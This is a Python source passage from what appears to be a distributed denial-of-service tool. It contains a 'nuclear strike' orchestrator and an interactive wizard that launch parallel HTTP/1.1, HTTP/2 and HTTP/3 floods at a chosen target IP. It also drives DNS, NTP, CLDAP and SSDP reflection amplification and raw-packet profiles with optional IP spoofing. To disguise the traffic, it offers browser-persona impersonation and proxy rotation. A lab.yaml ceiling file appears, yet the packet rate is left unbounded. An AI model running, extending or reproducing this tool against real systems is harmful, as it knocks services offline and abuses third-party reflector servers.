            elif self._label(profile) in self.started:
                # A running child streams counters; without them this row sat at
                # zero for the whole run and looked like a stalled profile.
                live = self.progress.get(self._label(profile))
                sent = live["sent"] if live else 0
                amp_str = "-"
                status = "[RUNNING]"
                # Counted here too, or the total sits at zero beside rows that
                # are plainly non-zero and the whole table reads as broken.
                total_sent += sent
                if sent > 0:
                    contributing += 1
            else:
                sent = 0
                amp_str = "-"
                status = "[STARTING]"

            print(f"{profile.name:<25} {self.pps:>6} {sent:>13,} {amp_str:>9} {status}")

        print("-" * 70)
        # Requested against achieved, never the requested figure alone. The old
        # total was pps * len(profiles), which claimed 100,000 pps for a run that
        # actually put ~9,100 on the wire - the number a reader would act on was
        # the fictional one.
        print(
            f"{'TOTAL':<25} {self.pps * len(self.profiles):>6} {total_sent:>13,} "
            f"{'-':>9} {elapsed:.1f}s / {self.duration}s"
        )
        print(
            f"  {contributing}/{len(self.profiles)} profiles contributing; "
            f"achieved {total_sent / max(elapsed, 1e-9):,.0f} pps of "
            f"{self.pps * len(self.profiles):,} requested"
        )
        if self._probe_total:
            pct = 100.0 * self._probe_ok / self._probe_total
            print(
                f"  target availability: {pct:.0f}% "
                f"({self._probe_ok}/{self._probe_total} probes answered)"
            )

    def _print_final_results(self) -> None:
        """Print final aggregated results."""
        print("\n" + "=" * 70)
        print("=== Nuclear Strike Complete ===")
        print(f"Target: {self.target_ip} | Duration: {self.duration}s | PPS/profile: {self.pps}")
        print()

        header = f"{'Profile':<25} {'Transport':<8} {'Handed to OS':>13} {'PPS':>8} {'Amp':>9} Status"
        print(header)
        print("-" * len(header))

        total_sent = 0
        total_pps = 0
        silent: list[str] = []
        empty: list[str] = []
        countable = 0
        for profile in self.profiles:
            result = self.results.get(self._label(profile))
            if result and result.get("success"):
                r = result["result"]
                sent = r.attack.packets_sent
                achieved_pps = r.attack.achieved_pps
                amp_str = r.attack.amplification_display()
                if sent > 0:
                    status = "[DONE]"
                    total_sent += sent
                    total_pps += achieved_pps
                    if self._addresses_observed_endpoint(profile):
                        countable += sent
                else:
                    status = "[EMPTY] sent nothing"
                    empty.append(profile.name)
            else:
                sent = 0
                achieved_pps = 0
                amp_str = "-"
                status = "[ERROR]"
                if result is None:
                    silent.append(profile.name)

            print(
                f"{profile.name:<25} {profile.transport.value:<8} {sent:>13,} "
                f"{achieved_pps:>8,.0f} {amp_str:>9} {status}"
            )

        print("-" * 70)
        print(f"{'TOTAL':<25} {'-':<8} {total_sent:>13,} {total_pps:>8,.0f} {'-':>9}")
        print(
            f"\n  'Handed to OS' counts packets given to the operating system. It is "
            f"not confirmation of delivery:\n  the target may have dropped them, "
            f"been firewalled, or never received them at all."
        )

        self._print_target_evidence(total_sent, countable)
        self._print_profile_warnings(silent, empty)
        self._print_failure_reasons()

        self._print_availability()

    def _addresses_observed_endpoint(self, profile: NuclearProfile) -> bool:
        """True if this profile sends HTTP requests to the port whose /stats was read.

        The target's counter sees one thing: HTTP requests its handler served. A
        UDP datagram to the same port, or a raw packet to any port, is invisible
        to it. Including those packets in the denominator of a delivery ratio
        compares two unrelated quantities, and *excluding* the wrong ones is just
        as bad: a run that delivered every HTTP request can then read as 180%.

        So this is deliberately narrow rather than "same port" - only the HTTP
        profile over a real socket produces a request this counter can count.
        """
        return (
            profile.profile is ProfileName.HTTP_FLOOD
            and profile.transport is TransportKind.SOCKET
            and profile.port == self._http_port()
        )

    def _print_target_evidence(self, total_sent: int, countable: int) -> None:
        """Print what the target itself counted, if it could be read.

        The only figure here that is evidence rather than effort. Without it the
        table's totals are the sender grading its own homework, which is how a
        run reporting 91,367 packets sent against a target that served nothing
        could read as a success.
        """
        print()
        print("Target-side evidence (/stats, read by the target itself):")
        if self._stats_before is None or self._stats_after is None:
            reason = getattr(self._observer, "_last_error", None)
            print("  NOT MEASURED - the target's /stats endpoint could not be read.")
            if reason:
                print(f"  reason: {reason}")
            print("  Without this, the totals above are packets attempted, not")
            print("  packets delivered. Nothing here confirms anything arrived.")
            return

        served = max(0, self._stats_after[0] - self._stats_before[0])
        errors = max(0, self._stats_after[1] - self._stats_before[1])
        print(f"  requests served by target : {served:,}")
        print(f"  errors reported by target : {errors:,}")

        if countable:
            share = served / countable
            print(
                f"  delivered / handed to OS  : {share:.1%} "
                f"({served:,} of {countable:,} addressed to this endpoint)"
            )
            if share < 0.5:
                print("  Most of what was sent to this endpoint did not become a")
                print("  served request.")
        elif total_sent:
            print("  No profile addressed this endpoint, so no delivery ratio can")
            print("  be formed. The served count above covers traffic from outside")
            print("  this run.")
        if total_sent > countable:
            print(
                f"  ({total_sent - countable:,} further packets went to ports or"
                f" protocols this counter does not see.)"
            )

    def _print_profile_warnings(self, silent: list[str], empty: list[str]) -> None:
        """Name the profiles that produced nothing, and say why that matters.

        Two distinct failures used to render identically as a row of zeroes: a
        profile that never reported at all, and one that reported success while
        sending nothing. The first means nothing was collected; the second means
        something ran and measured nothing. Both read as "sent nothing", which is
        how seven scapy profiles once appeared to complete successfully.
        """
        if silent:
            print()
            print(f"WARNING: {len(silent)} profile(s) never reported a result: "
                  f"{', '.join(silent)}")
            print("         Their rows above show zero because nothing was "
                  "collected, not because zero packets were sent.")
        if empty:
            print()
            print(f"WARNING: {len(empty)} profile(s) completed without sending a "
                  f"single packet: {', '.join(empty)}")
            print("         A profile that reports success while sending nothing "
                  "has measured nothing.")
            print("         Most often this is a privilege problem: the scapy "
                  "profiles need an")
            print("         elevated terminal plus Npcap, and without them they "
                  "open, run, and")
            print("         emit zero. Check the run's notes, or run one scapy "
                  "profile alone to see")
            print("         the refusal reason.")

    def _print_failure_reasons(self) -> None:
        """Print, per profile, why nothing reached the target.

        A row of zeroes is a symptom; this is the diagnosis. The reason lives in
        the child's own event and nowhere else, because the engine records a
        failed transport open as a note rather than an exception. Dropping it on
        the way back to the parent is what left a whole run of raw profiles
        reporting "sent nothing" with nothing to act on.
        """
        rows: list[tuple[str, str, int, int]] = []
        for profile in self.profiles:
            result = self.results.get(self._label(profile))
            if result is None or result.get("success"):
                continue
            reason = str(result.get("error") or "").strip()
            if not reason:
                reason = "the child reported no reason"
            payload = result.get("result")
            if payload is None:
                attempted = errors = 0
            else:
                attempted = payload.attack.packets_attempted
                errors = payload.attack.errors
            rows.append((profile.name, reason, attempted, errors))

        if not rows:
            return
        print()
        print("Why each profile sent nothing:")
        for name, reason, attempted, errors in rows:
            # "Never attempted" and "attempted 7,500, all failed" are different
            # faults, and the row above shows the same zero for both.
            if attempted or errors:
                print(
                    f"  {name}: {attempted:,} attempts, {errors:,} errors, "
                    f"0 packets sent"
                )
            else:
                print(f"  {name}: never attempted a packet")
            for line in reason.split("; "):
                print(f"    - {line}")

    def _build_configs(self) -> list[RunConfig]:
        """Build one RunConfig per profile, carrying every operator value.

        Extracted from run() so it can be asserted on directly. This is the
        function where the wizard's answers become the child processes'
        configuration, which makes it the one place a dropped value turns into a
        run that reports a number it did not use.
        """
        configs = []
        for profile in self.profiles:
            target = Target(host=self.target_ip, port=profile.port or 80)
            config = RunConfig(
                target=target,
                attack=AttackProfile(
                    profile=profile.profile,
                    pps=self.pps,
                    duration_seconds=self.duration,
                    payload_size=self.payload_size,
                    workers=self.workers,
                    spoof_sources=profile.spoof,
                    keep_alive=self.keep_alive,
                    use_tls=self.use_tls,
                    tls_verify=self.tls_verify,
                    use_http2=self.use_http2,
                    h2_concurrency=self.h2_concurrency,
                    # Spread with the model defaults so a strike that asked for
                    # none of them builds exactly the AttackProfile it built
                    # before these options existed. Passing "" here would fail
                    # the persona validator instead.
                    **self._identity_options(),
                ),
                transport=profile.transport,
                defenses=[],
                label=self._label(profile),
                proxy_file=self.proxy_file if profile.transport is TransportKind.PROXY else "",
            )
            configs.append(config)
        return configs

    def _identity_options(self) -> dict[str, str]:
        """Only the identity options that were actually requested.

        A wizard that does not ask about personas must produce a run that
        impersonates nothing, and the way to guarantee that is to leave the
        field out entirely rather than to pass an empty string and hope the
        default wins.
        """
        options: dict[str, str] = {}
        if self.fingerprint:
            options["fingerprint"] = self.fingerprint
        if self.fingerprint_rotation:
            options["fingerprint_rotation"] = self.fingerprint_rotation
        if self.h2_preamble:
            options["h2_preamble"] = self.h2_preamble
        return options

    def run(self) -> int:
        """Execute the nuclear strike."""
        self.start_time = time.time()

        # One /stats reading for the whole strike, opened before any child is
        # spawned. This is the only number in the output that is evidence of
        # delivery rather than of effort, and it has to be bracketing the entire
        # run: ten children each reading it would apply ten times the intended
        # probe load to a target that is already saturated, and all ten would
        # lose the race to answer.
        self._observer = TargetObserver(self.target_ip, self._http_port())
        self._stats_before = _read_stats(self._observer)

        # Pre-create configs for each profile
        configs = self._build_configs()

        # Spawn processes
        for config in configs:
            p = self._ctx.Process(
                target=run_profile_process,
                args=(config, self.result_queue),
                daemon=True,
            )
            p.start()
            self.processes.append(p)

        interrupted = False
        try:
            self._progress_loop()
        except KeyboardInterrupt:
            interrupted = True
            print("\nInterrupted, stopping all profiles...")

        self._reap()

        # Clean up multiprocessing queue to avoid atexit traceback on interrupt.
        # The Queue has a background feeder thread that must be joined.
        try:
            if hasattr(self.result_queue, '_writer'):
                writer = self.result_queue._writer
                if writer and writer.is_alive():
                    writer.join(timeout=1.0)
            self.result_queue.close()
            self.result_queue.join_thread()
        except Exception:
            pass

        if interrupted:
            # The strike was cut short, so the totals are not a measurement of
            # anything. Say so rather than presenting a partial run as a result.
            print(
                "\nInterrupted: totals above are partial and are not a "
                "measurement of the target."
            )
            return 130

        # Closing read, after every child is reaped: the target is no longer
        # being loaded, so it has drained and this does not compete with the run.
        self._stats_after = _read_stats(self._observer, timeout=10.0)
        self._print_final_results()
        return 0

    def _http_port(self) -> int:
        """The port the target-side /stats endpoint would be on.

        Taken from a socket-backed profile, since those address a real service.
        The amplification profiles point at a reflector, which does not serve
        /stats, so they cannot answer this question.
        """
        for profile in self.profiles:
            if profile.port and profile.transport is not TransportKind.SCAPY:
                return profile.port
        return 80

    def _reap(self, grace_s: float = 20.0) -> None:
        """Let children finish reporting, then stop whatever is left.

        Order matters. The previous version terminated stragglers from a
        ``finally`` block that ran *after* the final table had already been
        printed, so any child still working at the deadline was killed before it
        could put its result on the queue - and the run silently reported zero
        for a profile that had in fact been sending the whole time. Children are
        therefore given a chance to report first, and only then terminated.

        Scapy profiles need more time for socket teardown; default grace is
        increased to 20s to accommodate them.
        """
        deadline = time.time() + grace_s
        for p in self.processes:
            p.join(timeout=max(0.0, deadline - time.time()))
        for p in self.processes:
            if p.is_alive():
                p.terminate()
                p.join(timeout=1.0)
        # Anything a child managed to report during the grace period still
        # counts, so drain once more before the caller prints.
        self._drain()


def _read_stats(
    observer: TargetObserver, timeout: float | None = None
) -> tuple[int, int] | None:
    """One synchronous /stats reading. None when the target cannot answer."""
    return asyncio.run(observer.read(timeout=timeout))


def _ask_choice(
    prompt: str,
    choices: list[str],
    *,
    default: str,
    preset: str | None = None,
    choices_label: str = "choices",
) -> str:
    """Ask for one of *choices*, re-asking until the answer is one of them.

    A preset - the value a command-line flag already supplied - is stated and
    used without prompting, but is still validated: a flag carrying a bad value
    should fail here where the operator can see it, not silently fall back to the
    default and produce a run that differs from the one they asked for.

    An empty preset means "no preset". Tested explicitly, because `is not None`
    was the original test and it turned an unset value into a preset of "",
    which is not in any choice list and so aborted the wizard before it asked
    anything.
    """
    if preset:
        if preset not in choices:
            raise ValueError(
                f"{preset!r} is not a valid choice; pick one of: "
                + ", ".join(choices)
            )
        print(f"{prompt}: {preset} (from the command line)")
        return preset
    print(f"  {choices_label}: {', '.join(choices)}")
    while True:
        answer = _ask(prompt, default)
        if answer in choices:
            return answer
        print(f"  {answer!r} is not one of the {choices_label}")


def _ask_optional_str(
    prompt: str,
    *,
    preset: str | None = None,
    choices: list[str] | None = None,
    choices_label: str = "choices",
) -> str:
    """Ask for a free-text value where blank means "no".

    *choices*, when given, validates the answer against a fixed set the same way
    :func:`_ask_choice` does. Blank is always allowed and always means "no",
    because every caller uses this for an optional feature and a wizard that
    forces an answer to an optional question is a wizard that cannot be answered
    "no" without typing something meaningless.
    """
    if preset:
        print(f"{prompt}: {preset} (from the command line)")
        return preset
    if choices:
        print(f"  {choices_label}: {', '.join(choices)}")
    while True:
        # _ask is given "" rather than None on purpose: its signature treats None
        # as "this question has no default, so keep asking", which made a blank
        # answer loop forever with 'a value is required' and made an optional
        # question impossible to decline. "" is a real default, so a blank answer
        # returns "" and the caller sees "no".
        answer = _ask(prompt, "")
        if not answer:
            return ""
        if not choices or answer in choices:
            return answer
        if "," in answer and all(part.strip() in choices for part in answer.split(",")):
            return answer
        print(f"  {answer!r} is not one of the {choices_label}; blank to skip")


def _ask(prompt: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default else ""
    while True:
        try:
            answer = input(f"{prompt}{suffix}: ").strip()
        except EOFError:
            return default or ""
        if answer:
            return answer
        if default is not None:
            return default
        print("  a value is required")


def _ask_int(prompt: str, default: int) -> int:
    while True:
        raw = _ask(prompt, str(default))
        try:
            return int(raw)
        except ValueError:
            print(f"  {raw!r} is not a whole number")


def _ask_float(prompt: str, default: float) -> float:
    while True:
        raw = _ask(prompt, str(default))
        try:
            return float(raw)
        except ValueError:
            print(f"  {raw!r} is not a number")


def _ask_int_bounded(
    prompt: str,
    default: int,
    minimum: int,
    maximum: int,
    ceiling_name: str,
) -> int:
    """Ask for a whole number that is actually within policy.

    The bounds are stated in the question rather than discovered later. A value
    over the ceiling used to travel all the way to AttackProfile and come back
    as a raw pydantic ValidationError, so the operator was told the answer was
    invalid without being told what the valid range was.
    """
    suffix = f" (max {maximum:,} - {ceiling_name})"
    while True:
        value = _ask_int(f"{prompt}{suffix}", default)
        if value < minimum:
            print(f"  must be at least {minimum:,}")
            continue
        if value > maximum:
            print(
                f"  {value:,} exceeds the {ceiling_name} of {maximum:,}. "
                f"Raise it in lab.yaml if this is deliberate, or enter a value "
                f"within the limit."
            )
            continue
        return value


def _ask_yes_no(prompt: str, default: bool) -> bool:
    """Ask a yes/no question with a default."""
    suffix = " [y/N]" if not default else " [Y/n]"
    while True:
        raw = _ask(f"{prompt}{suffix}")
        if not raw:
            return default
        low = raw.lower()
        if low in ("y", "yes"):
            return True
        if low in ("n", "no"):
            return False
        print("  Please answer 'y' or 'n'")


def nuclear_wizard(
    *,
    fingerprint: str | None = None,
    fingerprint_rotation: str | None = None,
    h2_preamble: str | None = None,
    proxy_file: str | None = None,
) -> int:
    """Interactive wizard for nuclear mode.

    The four keyword arguments are values the caller already has - the matching
    command-line flags. Passing one skips the matching question and states what
    was chosen, because a flag the wizard silently ignores is worse than a flag
    the wizard does not have: the operator typed it, saw the wizard ask about
    something else, and reasonably concluded the two are unrelated.
    """
    print("\n=== Nuclear Strike ===")
    host = _ask("Target IP")
    port = _ask_int("Port (for TCP/UDP profiles)", 80)
    
    # Reflector ports are the well-known service ports and are not asked. A
    # different reflector means a different service, and the amplification
    # profiles are built around these, so offering the question invited an
    # answer that no profile could honour.
    reflector_ports = {
        "dns": 53,
        "ntp": 123,
        "cldap": 389,
        "ssdp": 1900,
    }
    
    # The ceilings come from lab.yaml, so the prompt and the gate can never
    # disagree about what the limit is.
    limits = load_lab_config().limits

    # PPS is not bounded: there is no throughput ceiling, so the prompt only
    # enforces that the value is a positive whole number.
    pps = _ask_int("PPS per profile", 500)
    if pps < 1:
        print("  must be at least 1")
        pps = _ask_int("PPS per profile", 500)
    duration = _ask_float("Duration (s)", 1000)
    if duration > limits.max_duration_seconds:
        print(
            f"  {duration:g}s exceeds max_duration_seconds of "
            f"{limits.max_duration_seconds:g}s; using the ceiling."
        )
        duration = float(limits.max_duration_seconds)

    # HTTP/3 for http_flood. Asked before HTTP/2 because it is exclusive with it:
    # one http_flood profile runs on one transport, and answering yes here means
    # HTTP/2 is not offered rather than being silently overridden.
    use_http3 = _ask_yes_no(
        "Use HTTP/3 (QUIC) for http_flood? (needs the aioquic package and a "
        "target that speaks h3; reports no received-bytes figure)",
        default=False,
    )
    if use_http3 and not aioquic_available():
        print("  [!] aioquic is not installed; running HTTP/1.1 instead.")
        print("      Install it with: pip install aioquic")
        use_http3 = False

    # HTTP/2 for http_flood (requires TLS)
    use_http2 = False if use_http3 else _ask_yes_no(
        "Use HTTP/2 for http_flood? (requires TLS, enables multiplexing)",
        default=False,
    )
    h2_concurrency = 100
    if use_http2:
        h2_concurrency = _ask_int_bounded(
            "HTTP/2 concurrent streams per connection", 100, 1, 1000, "model limit"
        )

    # Identity and egress. Each is a single question with a "no" default, so a
    # strike that answers no to all four is byte-identical to one from before
    # these features existed - which is the point of asking rather than
    # defaulting them on.
    # Named distinctly from the parameters on purpose. Assigning to the parameter
    # names before reading them as presets silently discards whatever the caller
    # passed, and the wizard then announces a value the operator never chose.
    chosen_fingerprint = _ask_optional_str(
        "Client personas for http_flood (comma-separated, blank = none)",
        preset=fingerprint,
        choices=list(FINGERPRINTS),
        choices_label="personas",
    )
    chosen_rotation = ""
    if chosen_fingerprint:
        chosen_rotation = _ask_choice(
            "  Rotate personas",
            ["per_connection", "per_request", "none"],
            default="per_connection",
            preset=fingerprint_rotation,
        )

    chosen_preamble = ""
    if use_http2:
        # Only meaningful on the connection layer, so only asked when http_flood
        # is actually speaking h2. `auto` follows the persona, which is what
        # keeps an impersonating strike from pairing a Chrome User-Agent with a
        # preamble no Chrome sends.
        chosen_preamble = _ask_choice(
            "  HTTP/2 connection preamble",
            ["auto", "none", *H2_PROFILE_KEYS],
            default="auto",
            preset=h2_preamble,
            choices_label="preambles",
        )

    chosen_proxy = _ask_optional_str(
        "Proxy list for http_flood (path, blank = none)",
        preset=proxy_file,
    )
    if chosen_proxy:
        # Load it here rather than letting ten children each discover it is
        # missing, and so the operator learns the list is empty before a strike
        # rather than during one. Note chosen_proxy, not the proxy_file
        # parameter: reading the parameter here loaded None whenever the answer
        # came from the prompt rather than from a flag, which is the only way
        # most operators will ever supply it.
        try:
            found = load_proxies(chosen_proxy)
        except ProxyListError as exc:
            print(f"  [!] {exc}")
            found = []
        if found:
            authenticated = sum(1 for p in found if p.needs_auth)
            detail = f", {authenticated} authenticated" if authenticated else ""
            print(
                f"  Loaded {len(found)} prox{'y' if len(found) == 1 else 'ies'}{detail}."
            )
            print(
                "  Only http_flood is proxied: the other profiles are UDP floods, "
                "amplification queries or raw packets, which no HTTP tunnel can carry."
            )
        else:
            print("  [!] That list has no usable entries; http_flood will run direct.")
            chosen_proxy = ""

    # HTTP/1.1 keep-alive
    keep_alive = _ask_yes_no(
        "Enable HTTP/1.1 keep-alive for http_flood? (higher throughput, delivery may overcount)",
        default=False,
    )

    # TLS options
    use_tls = _ask_yes_no(
        "Use TLS/HTTPS for http_flood? (auto-enabled on port 443)",
        default=False,
    )
    tls_verify = True
    # Asked for h3 as well as for TLS. QUIC is encrypted unconditionally, so
    # there is no "no TLS" answer to give - but the *verify* choice still exists,
    # and leaving it unasked meant an h3 run against a self-signed target failed
    # with a bare ConnectionError and no way to say so from the wizard.
    if use_tls or use_http3:
        tls_verify = _ask_yes_no(
            "Verify TLS certificates? (disable for self-signed certs)",
            default=True,
        )

    # Workers and payload
    # Worker threads are not asked. The policy ceiling is the value, so there
    # is no decision for the operator to make here: a prompt that only ever
    # wants the same answer is a step to skip. It was a prompt, and it was the
    # one value the wizard used to discard anyway - it used to be collected and
    # then replaced by a literal, which is the bug this removed.
    workers = limits.max_workers
    # State the value and where it came from. A missing lab.yaml is not an
    # error, it is the normal case, and it silently supplied 8 workers for a
    # run the operator believed was configured otherwise - so the number
    # governing the result was never visible anywhere before the strike began.
    if config_path(LAB_CONFIG_NAME).exists():
        worker_source = f"{config_path(LAB_CONFIG_NAME)}"
    else:
        worker_source = "built-in default (no lab.yaml)"
    print(f"  Worker threads per profile: {workers} (from {worker_source})")
    payload_size = _ask_int_bounded(
        "Payload size (bytes)", 512, 0, limits.max_payload_bytes, "max_payload_bytes"
    )

    # Spoofing is off by default (non-spoofed, real source IP).
    # Spoofed variants require raw socket privileges and are for controlled
    # reflection testing only. Default is non-spoofed (real source IP).
    enable_spoofing = _ask_yes_no(
        "Enable IP spoofing for raw profiles? (requires root/CAP_NET_RAW)",
        default=False,
    )

    # Check privileges
    is_admin, parent_raw = check_privileges()
    child_raw, child_reason = check_child_raw_capability()
    profiles = build_profiles(
        host, port, reflector_ports,
        enable_spoofing=enable_spoofing,
        use_http2=use_http2,
        use_http3=use_http3,
        proxy_file=chosen_proxy,
    )

    if not (is_admin and parent_raw):
        print("\n[!] Not running as Administrator or raw sending unavailable")
        print(f"   Reason: {raw_capability().reason}")
        if not child_raw:
            print(f"   Child check also failed: {child_reason}")
        profiles = _drop_privilege_profiles(profiles)
    elif not child_raw:
        print("\n[!] This process is elevated, but a spawned child cannot send raw packets")
        print(f"   Child reason: {child_reason}")
        print("   This happens when the PyInstaller re-exec does not preserve elevation.")
        print("   Raw profiles will fail silently; skipping them for this run.")
        profiles = _drop_privilege_profiles(profiles)

    # Only after the privilege filter: a port probe against a host we cannot
    # even address would report every profile closed and be mistaken for a
    # reason to run none of them.
    profiles, closed = filter_available_profiles(profiles, host)
    if closed:
        print("\n[!] Nothing is listening on these ports, so the packets would be")
        print("    discarded before reaching any application. Skipping:")
        for name, reason in closed:
            print(f"      - {name}: {reason}")
        print()

    # Check reflector ports for amplification profiles
    amp_profiles_by_protocol = {
        "dns": [p for p in profiles if p.profile == ProfileName.DNS_AMPLIFICATION],
        "ntp": [p for p in profiles if p.profile == ProfileName.NTP_AMPLIFICATION],
        "cldap": [p for p in profiles if p.profile == ProfileName.CLDAP_AMPLIFICATION],
        "ssdp": [p for p in profiles if p.profile == ProfileName.SSDP_AMPLIFICATION],
    }
    
    for protocol, profiles_list in amp_profiles_by_protocol.items():
        if not profiles_list:
            continue
        port = reflector_ports.get(protocol)
        if not port:
            continue
        # Only warn when the probe actually established the port is closed. A
        # timeout is not evidence of anything, and calling it "appears closed"
        # when it may equally have been a filtered packet is how this check came
        # to interrupt runs against reflectors that were working fine.
        if probe_udp_port(host, port):
            continue
        print(f"\n[!] WARNING: {protocol.upper()} reflector port {port} on {host} is closed.")
        print(f"    {protocol.upper()} amplification requires a valid open reflector on port {port}.")
        print("    Without a valid reflector, this profile will only send requests at")
        print("    low rate with no amplification.")
        print()
        proceed = _ask_yes_no(f"Continue {protocol.upper()} amplification anyway?", default=False)
        if not proceed:
            print("Exiting.")
            return 1
        print(f"    Continuing. {protocol.upper()} numbers will show queries sent, not traffic delivered.")

    if not profiles:
        print("No profiles available to run. Exiting.")
        return 1

    # Clamp to the configured ceilings before any child is spawned. A child
    # AttackProfile is built in _build_configs, and pydantic refuses an
    # over-large payload before a clamp applied to a profile could see it.
    guard = SafetyGuard()
    fields, policy_notes = guard.clamp_fields(
        pps=pps,
        duration_seconds=duration,
        payload_size=payload_size,
        workers=workers,
        h2_concurrency=h2_concurrency,
    )
    if policy_notes:
        print("Ceiling adjustments from lab.yaml:")
        for note in policy_notes:
            print(f"  {note}")
    pps = fields["pps"]
    duration = fields["duration_seconds"]
    payload_size = fields["payload_size"]
    workers = fields["workers"]
    h2_concurrency = fields["h2_concurrency"]

    # These must be the values the operator was asked for, not literals. The
    # aggregator is what builds the per-child AttackProfile, so hardcoding them
    # here silently discarded the wizard answers: a run configured for 200
    # workers spawned children with 4, and reported nothing about the
    # difference. The wizard prints the number, so a wrong literal is a
    # measurement the tool reports but did not perform.
    aggregator = NuclearAggregator(
        profiles=profiles,
        target_ip=host,
        pps=pps,
        duration=duration,
        payload_size=payload_size,
        workers=workers,
        keep_alive=keep_alive,
        use_tls=use_tls,
        tls_verify=tls_verify,
        use_http2=use_http2,
        h2_concurrency=h2_concurrency,
        use_http3=use_http3,
        fingerprint=chosen_fingerprint,
        fingerprint_rotation=chosen_rotation,
        h2_preamble=chosen_preamble,
        proxy_file=chosen_proxy,
    )

    return aggregator.run()
